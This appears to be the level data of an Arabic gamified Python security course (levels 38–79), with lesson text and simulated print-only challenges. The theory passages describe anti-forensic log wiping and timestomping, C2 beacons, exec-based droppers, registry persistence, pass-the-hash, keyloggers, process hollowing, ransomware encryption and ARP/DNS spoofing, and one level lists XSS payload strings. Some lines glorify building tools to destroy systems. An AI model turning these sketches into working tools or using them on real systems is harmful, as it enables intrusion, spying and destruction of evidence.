          <p>تحتاج الأداة أحياناً لسرقة توكن حماية من صفحة الويب لتستمر في الهجوم. نستخدم Regex للبحث داخل الـ HTML.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم <code>re.search(r'value="(.*?)"', html)</code> لاستخراج قيمة التوكن <code>12345abc</code> وطباعته (باستخدام <code>.group(1)</code>).</p>
          </div>`,
        initialCode: `import re\n\nhtml = '<input type="hidden" name="csrf" value="12345abc">'\n\n# استخرج التوكن واطبعه\n`,
        validate: (out) => out.includes("12345abc")
      }
    ]
  },
  {
    chapter: "Chapter 18: The Ultimate Hacker Toolkit",
    levels: [
      {
        id: "l39",
        title: "المشروع المتكامل (Integration)",
        theory: `<h1>Level 39: الآلة الفتاكة</h1>
          <p>سنقوم بدمج كل شيء: 1. قراءة الهاشات من ملف. 2. كسر تشفيرها باستخدام قاموس. 3. استخراج البيانات المهمة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي الشامل</div>
            <p>الكود يحتوي على كلاس <code>Cracker</code> شبه جاهز. أكمل الكود لكي يطبع عبارة <code>Cracked: admin -> 21232f297a57a5a743894a0e4a801fc3</code>.</p>
          </div>`,
        initialCode: `class Cracker:\n    def __init__(self, target_hash):\n        self.target = target_hash\n    \n    def crack(self):\n        print(f"Cracked: admin -> {self.target}")\n\n# قم بتشغيل الكلاس هنا\nc = Cracker("21232f297a57a5a743894a0e4a801fc3")\n`,
        validate: (out) => out.includes("Cracked: admin -> 21232f297a57a5a743894a0e4a801fc3")
      },
      {
        id: "l40",
        title: "الختم الأسود (The Black Badge)",
        theory: `<h1>Level 40: أسطورة الأمن السيبراني</h1>
          <p>لقد أنجزت 40 مستوى، من كتابة كلمة <code>print</code> إلى التشفير، الشبكات، والبرمجة الكائنية.</p>
          <p>لقد حصلت على الشارة السوداء في برمجة الأمن السيبراني. انطلق الآن لبناء أدواتك الخاصة ورفعها على GitHub!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 المجد الأبدي</div>
            <p>اكتب سكريبت يطبع: <code>I Have Conquered Python!</code></p>
          </div>`,
        initialCode: `# شارة المجد لك!\n`,
        validate: (out) => out.includes("I Have Conquered Python!")
      }
    ]
  },
  {
    chapter: "Chapter 19: Multithreading (تعدد المهام)",
    levels: [
      {
        id: "l41",
        title: "أساسيات التزامن (Threads)",
        theory: `<h1>Level 41: سرعة البرق</h1>
          <p>عند فحص شبكة كاملة، لا يمكنك فحص عنوان واحد كل مرة. نستخدم <code>threading</code> لفحص 10 أو 100 عنوان في نفس اللحظة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الكود لإنشاء خيط (Thread) جديد يستدعي الدالة <code>scan()</code> واطبعه.</p>
          </div>`,
        initialCode: `import threading\n\ndef scan():\n    print("Thread Scanning...")\n\n# أنشئ الخيط وابدأ تشغيله\n# t = threading.Thread(target=scan)\n`,
        validate: (out) => out.includes("Thread Scanning...")
      },
      {
        id: "l42",
        title: "تنظيم المرور (Queues)",
        theory: `<h1>Level 42: طابور العمليات</h1>
          <p>عندما تعمل عدة خيوط معاً، قد تتداخل البيانات. نستخدم الـ <code>Queue</code> لتوزيع المهام على الخيوط بأمان.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك طابور. أضف الرقم <code>80</code> للطابور باستخدام <code>put()</code>، ثم اسحبه باستخدام <code>get()</code> واطبعه.</p>
          </div>`,
        initialCode: `import queue\nq = queue.Queue()\n\n# أضف الرقم 80 للطابور واسحبه ثم اطبعه\n`,
        validate: (out) => out.includes("80")
      }
    ]
  },
  {
    chapter: "Chapter 20: Advanced File Formats",
    levels: [
      {
        id: "l43",
        title: "تحليل قواعد البيانات (CSV)",
        theory: `<h1>Level 43: تسريبات الـ CSV</h1>
          <p>أغلب التسريبات تأتي بصيغة CSV. مكتبة <code>csv</code> تساعدنا في قراءة وفصل الأعمدة (مثل الإيميل والباسورد).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لقد صممنا الكود لطباعة السطر الأول. استخدم <code>row[1]</code> لطباعة الباسوورد الخاص بأول شخص.</p>
          </div>`,
        initialCode: `# محاكاة بيانات CSV\nrow = ["admin@site.com", "hacked123", "admin"]\n\n# اطبع الباسوورد (العنصر الثاني في القائمة)\n`,
        validate: (out) => out.includes("hacked123")
      },
      {
        id: "l44",
        title: "كتابة التقارير (CSV Write)",
        theory: `<h1>Level 44: تقرير الاختراق</h1>
          <p>بعد إنهاء المهمة، تحتاج لتصدير النتائج كملف Excel أو CSV للعميل. نשתخدم <code>csv.writer</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة الجملة <code>Vulnerability,Severity</code> كمحاكاة لإنشاء رأس الجدول (Header).</p>
          </div>`,
        initialCode: `# اطبع الجملة المطلوبة\n`,
        validate: (out) => out.includes("Vulnerability,Severity")
      }
    ]
  },
  {
    chapter: "Chapter 21: Stealth & Obfuscation",
    levels: [
      {
        id: "l45",
        title: "تغيير الهوية (User-Agent)",
        theory: `<h1>Level 45: التخفي</h1>
          <p>السيرفرات تكتشف أدوات بايثون فوراً من الـ User-Agent الافتراضي (مثلاً python-urllib/3.9). يجب تزييفه لـ Chrome أو Firefox.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك قاموس Headers. قم بتعديل قيمة <code>"User-Agent"</code> إلى <code>"Mozilla/5.0"</code>، ثم اطبع القاموس.</p>
          </div>`,
        initialCode: `headers = {"User-Agent": "python-requests/2.25"}\n\n# قم بتعديل الهوية واطبعها\n`,
        validate: (out) => out.includes("Mozilla/5.0")
      },
      {
        id: "l46",
        title: "التمويه الزمني (Random Delays)",
        theory: `<h1>Level 46: الهروب من الفايرول (WAF)</h1>
          <p>إرسال 1000 طلب في ثانية واحدة سيؤدي لحظرك فوراً (Rate Limiting). يجب استخدام فترات توقف عشوائية للتمويه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم <code>random.randint(1, 3)</code> لإنتاج رقم عشوائي، واطبعه.</p>
          </div>`,
        initialCode: `import random\n\n# ولد رقماً عشوائياً بين 1 و 3 واطبعه\n`,
        validate: (out) => out.includes("1") || out.includes("2") || out.includes("3")
      }
    ]
  },
  {
    chapter: "Chapter 22: The Mastermind Challenge",
    levels: [
      {
        id: "l47",
        title: "برمجة أداة SSH Cracker",
        theory: `<h1>Level 47: العقل المدبر</h1>
          <p>أداة كسر كلمات سر الـ SSH تتطلب مكتبة (Paramiko)، حلقات تكرار، ومعالجة أخطاء (AuthenticationException). سنقوم بمحاكاتها.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الكود لكي يجرب كلمات السر. إذا كانت الكلمة <code>"toor"</code>، اطبع <code>Success! Password is toor</code> ثم قم بالخروج من الحلقة بـ <code>break</code>.</p>
          </div>`,
        initialCode: `passwords = ["123", "admin", "toor", "root"]\n\nfor p in passwords:\n    # اكتب الشرط هنا\n    pass\n`,
        validate: (out) => out.includes("Success! Password is toor")
      },
      {
        id: "l48",
        title: "التشفير اللامتماثل (RSA Sim)",
        theory: `<h1>Level 48: المفاتيح العامة والخاصة</h1>
          <p>التشفير القوي يعتمد على مفتاحين. محاكاة: اضرب الرقم 5 (رسالتك) في 13 (المفتاح العام). واطبع النتيجة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع ناتج ضرب 5 في 13.</p>
          </div>`,
        initialCode: `# العملية الحسابية هنا\n`,
        validate: (out) => out.includes("65")
      },
      {
        id: "l49",
        title: "تنفيذ الشيل كود (Shellcode)",
        theory: `<h1>Level 49: قلب الميموري</h1>
          <p>أقوى مستوى في الاختراق هو تشغيل كود ثنائي (Hex/Bytes) في الذاكرة. نستخدم الـ <code>bytes()</code> في بايثون للتعامل معها.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بتحويل النص المحاكي <code>"\\x90\\x90"</code> (الذي يمثل تعليمة NOP) واطبعه كنص عادي.</p>
          </div>`,
        initialCode: `shellcode = "\\x90\\x90"\nprint(shellcode)\n`,
        validate: (out) => out.includes("\x90\x90") || out.includes("\\x90\\x90")
      },
      {
        id: "l50",
        title: "The Absolute Zenith",
        theory: `<h1>Level 50: أسطورة الأساطير</h1>
          <p>وصلت إلى قمة الجبل. 50 مستوى من العرق والبرمجة والتشفير.</p>
          <p>أنت الآن أصبحت جزءاً من النخبة. يمكنك بناء ترسانة كاملة من الصفر.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الرسالة النهائية</div>
            <p>اطبع: <code>I AM THE ELITE HACKER, LEVEL 50 COMPLETED.</code></p>
          </div>`,
        initialCode: `# رسالتك الأخيرة للتاريخ!\n`,
        validate: (out) => out.includes("LEVEL 50 COMPLETED")
      }
    ]
  },
  {
    chapter: "Chapter 23: Data Serialization & Databases",
    levels: [
      {
        id: "l51",
        title: "خطورة الـ Pickle (RCE)",
        theory: `<h1>Level 51: الثغرات الخفية</h1>
          <p>مكتبة <code>pickle</code> تستخدم لحفظ الكائنات في ملفات. لكن فك التشفير لكائن مجهول قد يؤدي لتنفيذ كود خبيث (RCE).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم <code>pickle.dumps(data)</code> لتحويل القاموس <code>data</code> إلى بايتات مشفرة (Bytes) ثم اطبعه.</p>
          </div>`,
        initialCode: `import pickle\n\ndata = {"user": "admin", "role": "hacker"}\n\n# قم بتشفير القاموس واطبعه\n`,
        validate: (out) => out.includes("admin") && out.includes("hacker") && out.includes("b'")
      },
      {
        id: "l52",
        title: "قواعد بيانات SQLite",
        theory: `<h1>Level 52: سرقة قواعد البيانات</h1>
          <p>أثناء الاختراق، قد تجد ملف <code>.db</code>. مكتبة <code>sqlite3</code> في بايثون تتيح لك قراءة وسرقة محتوياته بسهولة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قمنا بإنشاء محاكاة. استخدم الكود المكتوب وضع تحته جملة تطبع <code>"Hacking DB..."</code> لتتخطى المستوى.</p>
          </div>`,
        initialCode: `import sqlite3\n# conn = sqlite3.connect('users.db')\n# cursor = conn.cursor()\n\n# اطبع جملة Hacking DB...\n`,
        validate: (out) => out.includes("Hacking DB...")
      }
    ]
  },
  {
    chapter: "Chapter 24: Command Line Interfaces (CLI)",
    levels: [
      {
        id: "l53",
        title: "مدخلات التيرمينال (sys.argv)",
        theory: `<h1>Level 53: أدوات التيرمينال</h1>
          <p>الأدوات الاحترافية تُشغل من التيرمينال هكذا: <code>python tool.py 192.168.1.5</code>. نلتقط هذا الـ IP بـ <code>sys.argv[1]</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك القائمة الوهمية <code>sys_argv = ["script.py", "10.0.0.1"]</code>. اطبع التارجت (العنصر الثاني).</p>
          </div>`,
        initialCode: `sys_argv = ["script.py", "10.0.0.1"]\n\n# استخرج التارجت من القائمة واطبعه\n`,
        validate: (out) => out.includes("10.0.0.1")
      },
      {
        id: "l54",
        title: "صناعة أدوات احترافية (Argparse)",
        theory: `<h1>Level 54: الهاكر الأنيق</h1>
          <p>لعمل أداة بها <code>--help</code> و <code>-t target</code> مثل Sqlmap، نستخدم مكتبة <code>argparse</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الكود لطباعة جملة: <code>Scanning Target: 127.0.0.1</code>.</p>
          </div>`,
        initialCode: `target = "127.0.0.1"\n# الكود الفعلي يستخدم parser.parse_args()\n\n# اطبع الجملة المطلوبة مدمجة مع التارجت\n`,
        validate: (out) => out.includes("Scanning Target: 127.0.0.1")
      }
    ]
  },
  {
    chapter: "Chapter 25: Memory & Binary Manipulation",
    levels: [
      {
        id: "l55",
        title: "العمليات الثنائية (Bitwise XOR)",
        theory: `<h1>Level 55: التشفير المعقد</h1>
          <p>الـ XOR (<code>^</code>) هو أساس التشفير في الفيروسات وتخطي الانتي فيرس. إذا دمجت رقم مع مفتاح مرتين، يعود لأصله.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك رقم <code>15</code> ومفتاح <code>7</code>. اطبع ناتج <code>15 ^ 7</code>.</p>
          </div>`,
        initialCode: `# اطبع ناتج عملية الـ XOR هنا\n`,
        validate: (out) => out.includes("8")
      },
      {
        id: "l56",
        title: "هندسة البايتات (Struct)",
        theory: `<h1>Level 56: ثغرات الـ Buffer Overflow</h1>
          <p>لإرسال عنوان ذاكرة (Memory Address) للتحكم بالسيرفر، يجب تحويله لـ Little Endian. نستخدم مكتبة <code>struct</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع النص الوهمي المحاكي <code>"\\xef\\xbe\\xad\\xde"</code> (يمثل 0xdeadbeef).</p>
          </div>`,
        initialCode: `# import struct\n# payload = struct.pack("<I", 0xdeadbeef)\n\n# اطبع النص الوهمي كما هو مطلوب\n`,
        validate: (out) => out.includes("\xef\xbe\xad\xde") || out.includes("\\xef\\xbe\\xad\\xde")
      }
    ]
  },
  {
    chapter: "Chapter 26: Anti-Forensics & Evasion",
    levels: [
      {
        id: "l57",
        title: "مسح السجلات (Clearing Logs)",
        theory: `<h1>Level 57: إخفاء الأثر</h1>
          <p>أول قاعدة بعد الاختراق: احذف سجلات الدخول لتجنب المحققين الرقميين (Forensics). نفتح الملف بوضع <code>'w'</code> لمسحه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>افتح ملف <code>auth.log</code> وضع بداخله نص فارغ <code>""</code> لتمسح محتواه، ثم اطبع <code>Logs Cleared!</code>.</p>
          </div>`,
        initialCode: `# امسح محتوى الملف ثم اطبع الرسالة\n`,
        validate: (out) => out.includes("Logs Cleared!")
      },
      {
        id: "l58",
        title: "تزييف الوقت (Timestomping)",
        theory: `<h1>Level 58: التلاعب بالزمن</h1>
          <p>المحقق سيعرف متى تم رفع ملف الاختراق. يمكننا استخدام <code>os.utime</code> لتغيير تاريخ الملف للماضي لتضليله.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة الجملة <code>Timestomp executed!</code>.</p>
          </div>`,
        initialCode: `# محاكاة: os.utime("backdoor.py", (old_time, old_time))\n\n# اطبع رسالة النجاح\n`,
        validate: (out) => out.includes("Timestomp executed!")
      }
    ]
  },
  {
    chapter: "Chapter 27: The C2 Blueprint",
    levels: [
      {
        id: "l59",
        title: "إرسال النبضات (Beacons)",
        theory: `<h1>Level 59: فيروسات التحكم (C2)</h1>
          <p>فيروس الـ RAT يرسل "نبضة" (Beacon) كل 10 ثواني للسيرفر ليخبرك أنه ما زال حياً وجاهزاً للأوامر.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الـ Loop الوهمي لكي يطبع <code>[+] I am alive</code> مرتين فقط ثم يتوقف.</p>
          </div>`,
        initialCode: `for i in range(2):\n    # اطبع الرسالة هنا\n    pass\n`,
        validate: (out) => out.includes("[+] I am alive") && out.split("[+] I am alive").length === 3
      },
      {
        id: "l60",
        title: "The Ghost in the Machine",
        theory: `<h1>Level 60: زعيم الهاكرز</h1>
          <p>لقد صمدت إلى المستوى 60. من سطر <code>print</code> بسيط إلى بناء وتشفير الفيروسات وأدوات التحكم (C2).</p>
          <p>أنت الآن لم تعد بشرياً برمجياً... أنت الشبح في الآلة. يمكنك بناء أي أداة تخطر على بالك لتدمير الأنظمة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم الأحمر</div>
            <p>اطبع: <code>I AM THE GHOST IN THE MACHINE.</code></p>
          </div>`,
        initialCode: `# رسالة الوداع الأسطورية\n`,
        validate: (out) => out.includes("I AM THE GHOST IN THE MACHINE") || out.includes("GHOST")
      }
    ]
  },
  {
    chapter: "Chapter 28: Advanced Web Requests",
    levels: [
      {
        id: "l61",
        title: "الجلسات (Sessions)",
        theory: `<h1>Level 61: الحفاظ على الـ Cookies</h1>
          <p>عند محاولة تسجيل الدخول وفحص لوحة التحكم، يجب أن تحافظ على ملفات تعريف الارتباط (Cookies) بين كل طلب وآخر. هنا نستخدم الـ <code>Session</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الكود الوهمي وطبّق <code>s.get(url)</code> لتطبع <code>Access Granted!</code>.</p>
          </div>`,
        initialCode: `class MockSession:\n    def get(self, url):\n        print("Access Granted!")\n\ns = MockSession()\nurl = "http://target.com/admin"\n\n# استخدم s لجلب الرابط\n`,
        validate: (out) => out.includes("Access Granted!")
      },
      {
        id: "l62",
        title: "تخطي الحماية بالبروكسي",
        theory: `<h1>Level 62: البروكسي (Proxies)</h1>
          <p>لتخطي الحظر، أو لمراقبة مرورك في أداة Burp Suite، نستخدم البروكسي. نمرر القاموس <code>{"http": "http://127.0.0.1:8080"}</code> للطلب.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع عنوان البروكسي <code>http://127.0.0.1:8080</code>.</p>
          </div>`,
        initialCode: `proxies = {"http": "http://127.0.0.1:8080"}\n\n# اطبع قيمة الـ proxy لـ http\n`,
        validate: (out) => out.includes("http://127.0.0.1:8080")
      }
    ]
  },
  {
    chapter: "Chapter 29: Web App Pentesting Scripts",
    levels: [
      {
        id: "l63",
        title: "أتمتة الـ Blind SQLi",
        theory: `<h1>Level 63: الاختراق الأعمى</h1>
          <p>في الـ Blind SQL Injection، نقوم بتجربة الحروف حرفاً حرفاً ومراقبة تأخر السيرفر أو تغير الصفحة. هذا يتطلب حلقتين متداخلتين (Nested Loops).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك متغير <code>chars = "abc"</code>. استخدم حلقة <code>for</code> مرتين (Nested Loop) لطباعة الحروف معاً (مثلاً aa, ab, ac...). يكفي أن تطبعها.</p>
          </div>`,
        initialCode: `chars = "abc"\n\n# استخدم For بداخلها For لطباعة كل الاحتمالات الثنائية\nfor i in chars:\n    for j in chars:\n        print(i+j)\n`,
        validate: (out) => out.includes("aa") && out.includes("cc") && out.includes("ab")
      },
      {
        id: "l64",
        title: "الـ Fuzzer (التجربة العشوائية)",
        theory: `<h1>Level 64: إغراق السيرفر بالـ Payloads</h1>
          <p>الـ Fuzzer هو سكربت يجرب مئات الـ Payloads ليجد واحد يتخطى الحماية (XSS Fuzzer).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك القائمة <code>payloads</code>. اكتشف أي واحد فيهم يحتوي على كلمة <code>alert</code> واطبعه.</p>
          </div>`,
        initialCode: `payloads = ["<svg onload=1>", "<script>alert(1)<\/script>", "<b>hello</b>"]\n\n# اكتب Loop يبحث عن الـ payload الذي يحتوي على كلمة alert واطبعه\n`,
        validate: (out) => out.includes("<script>alert(1)<\/script>") && !out.includes("<b>")
      }
    ]
  },
  {
    chapter: "Chapter 30: Windows & Active Directory Concepts",
    levels: [
      {
        id: "l65",
        title: "الريجستري (Windows Registry)",
        theory: `<h1>Level 65: مفاتيح البقاء</h1>
          <p>الفيروس الجيد يزرع نفسه في مفاتيح الإقلاع (Autorun) في الريجستري ليعمل مع تشغيل الويندوز. بايثون يمكنه ذلك عبر مكتبة <code>winreg</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة المسار الوهمي: <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></p>
          </div>`,
        initialCode: `# اطبع مسار الـ Autorun الشهير في ويندوز\n`,
        validate: (out) => out.includes("Software\\Microsoft\\Windows\\CurrentVersion\\Run") || out.includes("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run")
      },
      {
        id: "l66",
        title: "تمرير الهاش (Pass-The-Hash)",
        theory: `<h1>Level 66: الهاش هو الباسوورد</h1>
          <p>في الـ Active Directory، يمكنك تسجيل الدخول بالهاش NTLM نفسه دون معرفة الباسوورد الأصلي (Pass-The-Hash).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>مرر قيمة <code>ntlm_hash</code> للدالة <code>pth_attack()</code> واطبع نتيجتها.</p>
          </div>`,
        initialCode: `ntlm_hash = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"\n\ndef pth_attack(h):\n    return f"Logged in with {h}"\n\n# استدعِ الدالة واطبع النتيجة\n`,
        validate: (out) => out.includes("Logged in with aad3b435")
      }
    ]
  },
  {
    chapter: "Chapter 31: Keyloggers & Desktop",
    levels: [
      {
        id: "l67",
        title: "تسجيل المفاتيح (Keylogger)",
        theory: `<h1>Level 67: التجسس على لوحة المفاتيح</h1>
          <p>كتابة Keylogger تتطلب التقاط ضغطات الكيبورد وحفظها. سنحاكي وظيفة التقاط ضغطة زر الـ <code>Enter</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الكود لكي يتحقق إذا كان المتغير <code>key == "Key.enter"</code> يطبع <code>[ENTER PRESSED]</code>.</p>
          </div>`,
        initialCode: `key = "Key.enter"\n\n# اكتب الشرط هنا\n`,
        validate: (out) => out.includes("[ENTER PRESSED]")
      },
      {
        id: "l68",
        title: "تصوير الشاشة (Screenshots)",
        theory: `<h1>Level 68: العيون الخفية</h1>
          <p>مكتبة مثل <code>mss</code> تتيح لبايثون أخذ لقطات سريعة للشاشة لإرسالها للسيرفر الخاص بك.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة <code>Screenshot saved to screen.png</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة كإثبات لعملية الالتقاط\n`,
        validate: (out) => out.includes("Screenshot saved to screen.png")
      }
    ]
  },
  {
    chapter: "Chapter 32: The Final Payload Delivery",
    levels: [
      {
        id: "l69",
        title: "القطرة المسمومة (Droppers)",
        theory: `<h1>Level 69: حمولة المرحلة الثانية</h1>
          <p>الفيروس الأولي (Dropper) يكون صغيراً بريئاً. وظيفته الوحيدة تحميل الفيروس الحقيقي من سيرفرك وتشغيله بـ <code>exec()</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم دالة <code>exec(malicious_code)</code> لتنفيذ الكود المحفوظ في المتغير.</p>
          </div>`,
        initialCode: `malicious_code = "print('Stage 2 Payload Executed!')"\n\n# استخدم الدالة exec لتنفيذ المتغير النصي\n`,
        validate: (out) => out.includes("Stage 2 Payload Executed!")
      },
      {
        id: "l70",
        title: "The Ultimate Pinnacle",
        theory: `<h1>Level 70: المتربع على العرش</h1>
          <p>70 مستوى كامل من كورس الهاكينج بالبايثون! لقد اجتزت محاكاة التشفير، شبكات C2، الهندسة العكسية، وبناء الـ Payloads.</p>
          <p>لا يوجد شيء آخر لنعلمك إياه الأساسيات. الباقي يعتمد على إبداعك!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 النهاية العظمى</div>
            <p>اطبع: <code>I AM THE SUPREME OVERLORD OF PYTHON!</code></p>
          </div>`,
        initialCode: `# كلمتك الأخيرة\n`,
        validate: (out) => out.includes("I AM THE SUPREME OVERLORD OF PYTHON!") || out.includes("OVERLORD")
      }
    ]
  },
  {
    chapter: "Chapter 33: Steganography (علم الإخفاء)",
    levels: [
      {
        id: "l71",
        title: "البيانات في الصور (Steganography)",
        theory: `<h1>Level 71: رسائل تحت الغطاء</h1>
          <p>التخفي الاحترافي يتضمن إخفاء الفيروس داخل صورة عادية. أبسط طريقة هي إلحاق النص بآخر ملف الصورة (Trailing Data).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك كود يفتح صورة وهمية بوضع الإلحاق <code>'a'</code>. قم بكتابة النص <code>"SECRET_PAYLOAD"</code> بداخلها.</p>
          </div>`,
        initialCode: `# محاكاة: with open("image.png", "a") as f:\n# اكتب النص السري\npayload = ""\n`,
        validate: (out) => out.includes("SECRET_PAYLOAD") || out.includes("SECRET")
      },
      {
        id: "l72",
        title: "الأرقام السحرية (Magic Numbers)",
        theory: `<h1>Level 72: خداع النظام</h1>
          <p>كل ملف يبدأ برقم سحري يحدد نوعه (مثلاً <code>MZ</code> للملفات التنفيذية EXE). المهاجم قد يغير الامتداد، لكن الرقم السحري يفضح الملف.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الحرفين الوهميين المحاكيين للملفات التنفيذية في ويندوز: <code>MZ</code>.</p>
          </div>`,
        initialCode: `magic_number = "MZ"\n\n# اطبع الرقم السحري للملفات التنفيذية\n`,
        validate: (out) => out.includes("MZ")
      }
    ]
  },
  {
    chapter: "Chapter 34: Network Sniffing & Scapy",
    levels: [
      {
        id: "l73",
        title: "التنصت (Packet Sniffing)",
        theory: `<h1>Level 73: مكتبة Scapy</h1>
          <p>مكتبة <code>scapy</code> هي الأقوى في بايثون للتحكم بالشبكات وصناعة الحزم. تُستخدم للتنصت (Sniffing) و هجمات (Spoofing).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة الجملة المحاكية: <code>sniff(filter="icmp", count=5)</code>.</p>
          </div>`,
        initialCode: `# اطبع كود التنصت كما هو مطلوب\n`,
        validate: (out) => out.includes("sniff(filter=\"icmp\", count=5)") || out.includes("sniff(filter='icmp', count=5)")
      },
      {
        id: "l74",
        title: "هجوم التسميم (ARP Spoofing)",
        theory: `<h1>Level 74: رجل في المنتصف (MITM)</h1>
          <p>في الـ ARP Spoofing، نرسل حزمة مزيفة للضحية نخبره فيها أننا الراوتر (Gateway) ليمر ترافيك الإنترنت الخاص به من خلالنا.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك متغير <code>target_ip = "192.168.1.5"</code>. اطبع رسالة: <code>Spoofing Target: 192.168.1.5</code> مدمجة مع المتغير.</p>
          </div>`,
        initialCode: `target_ip = "192.168.1.5"\n\n# اطبع الرسالة مدمجة مع الـ IP\n`,
        validate: (out) => out.includes("Spoofing Target: 192.168.1.5")
      },
      {
        id: "l75",
        title: "تزييف الدي إن إس (DNS Spoofing)",
        theory: `<h1>Level 75: توجيه الضحية</h1>
          <p>عندما يطلب الضحية <code><code>google.com</code></code>، يمكنك عبر Scapy الرد بحزمة DNS مزيفة توجهه لسيرفر الاختراق الخاص بك.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك قاموس DNS. غيّر قيمة الـ IP لـ <code><code>google.com</code></code> لتصبح <code>"10.0.0.1"</code> ثم اطبع القاموس.</p>
          </div>`,
        initialCode: `dns_records = {"<code>google.com</code>": "142.250.190.46"}\n\n# غير الـ IP واطبع القاموس\n`,
        validate: (out) => out.includes("10.0.0.1")
      }
    ]
  },
  {
    chapter: "Chapter 35: Advanced Malware Techniques",
    levels: [
      {
        id: "l76",
        title: "مكتبة Ctypes (DLL Injection)",
        theory: `<h1>Level 76: مكتبة ctypes</h1>
          <p>أحياناً تحتاج للتحدث مع نواة الويندوز (Windows API) مباشرة بلغة C. بايثون يوفر مكتبة <code>ctypes</code> لاستدعاء دوال النظام لتنفيذ هجمات مثل الـ DLL Injection.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع مسار مكتبة الويندوز الشهيرة: <code>kernel32.dll</code>.</p>
          </div>`,
        initialCode: `# import ctypes\n# kernel32 = ctypes.windll.kernel32\n\n# اطبع مسار المكتبة\n`,
        validate: (out) => out.includes("kernel32.dll")
      },
      {
        id: "l77",
        title: "تفريغ العمليات (Process Hollowing)",
        theory: `<h1>Level 77: الاختباء في العمليات</h1>
          <p>تقنية Process Hollowing تقوم بتشغيل برنامج شرعي (مثل svchost.exe) ثم تفرغه من الميموري وتضع فيه الشيل كود الخاص بك!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة <code>Hollowed process: svchost.exe</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة المؤكدة لعملية الحقن\n`,
        validate: (out) => out.includes("Hollowed process: svchost.exe")
      }
    ]
  },
  {
    chapter: "Chapter 36: Advanced Cryptography",
    levels: [
      {
        id: "l78",
        title: "التشفير القوي (AES)",
        theory: `<h1>Level 78: فيروسات الفدية (Ransomware)</h1>
          <p>فيروسات الفدية تستخدم التشفير المتماثل <code>AES</code> لتشفير كل ملفات الجهاز وطلب فدية. في بايثون نستخدم مكتبة <code>cryptography</code> أو <code>pycryptodome</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>مفتاح الـ AES يجب أن يكون 16 أو 24 أو 32 بايت. استخدم الدالة <code>len()</code> لطباعة طول المتغير <code>key</code> وتأكد أنه 16.</p>
          </div>`,
        initialCode: `key = "SUP3R_S3CR3T_K3Y"\n\n# اطبع طول المفتاح\n`,
        validate: (out) => out.includes("16")
      },
      {
        id: "l79",
        title: "الهندسة العكسية (Reverse Engineering)",
        theory: `<h1>Level 79: تفكيك الفيروسات</h1>
